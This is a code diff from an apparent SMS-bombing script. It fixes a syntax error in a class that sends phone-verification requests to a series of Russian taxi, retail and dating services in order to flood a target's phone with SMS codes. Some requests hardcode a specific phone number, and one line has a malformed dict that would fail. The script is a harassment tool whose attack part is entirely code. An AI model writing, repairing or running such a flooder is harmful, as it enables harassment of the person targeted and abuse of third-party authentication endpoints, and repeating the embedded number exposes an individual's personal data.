@@ -54,7 +54,7 @@ class spymer:
 			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 			belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
 			tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-			vkusvill = requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php', data={'USER_PHONE': '+7 (915) 350-9908''token': '*','is_retry': 'Y'})
+			vkusvill = requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php', data={'USER_PHONE': '+7 (915) 350-9908','token': '*','is_retry': 'Y'})
 			karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
 			uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', json={{'PhoneNumber': '79153509908', 'Captcha': 'rasd'}}, headers={})
 			taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
